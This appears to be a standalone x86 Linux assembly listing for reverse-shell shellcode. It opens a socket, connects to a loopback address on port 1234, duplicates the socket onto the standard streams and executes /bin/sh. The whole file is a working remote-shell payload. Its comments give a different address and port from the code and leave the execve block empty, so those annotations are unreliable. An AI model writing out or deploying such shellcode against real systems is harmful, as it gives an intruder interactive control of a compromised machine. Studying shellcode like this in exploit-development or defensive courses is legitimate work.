global _start
section .text
_start:
	xor ebx,ebx
	mul ebx

	;fd = socket(2,1,0);{
	push ebx
	push 0x1
	push 0x2
	mov ecx,esp
	mov bl, 0x1
	mov al, 0x66
	int 0x80
	;}
	xchg edx,eax
	;srv.sin_family=2;srv.sin_port=htons(0xD304);srv.sin_addr.s_addr=inet_addr("127.0.0.1");{
	push 0x0101017f
	push word 0xd204
	push word 0x2
	mov ecx, esp
	;}

	;connect(fd,(struct sockaddr*)&srv,16);{
	push 0x10
	push ecx
	push edx

	mov ecx, esp
	mov bl, 0x3
	mov al,0x66
	int 0x80
	;}

    xchg ebx,edx ; now ebx contains sock descriptor

    dec dl
    dup2loop:
    mov ecx, edx
    mov al, 0x3f
    int 0x80
    dec edx
    jns dup2loop

    inc edx
    push ecx
    push 0x68732f6e
    push 0x69622f2f
    mov ebx, esp

    mov al, 0x0b
    int 0x80

	;execve("/bin/sh",NULL,NULL);{

	;}
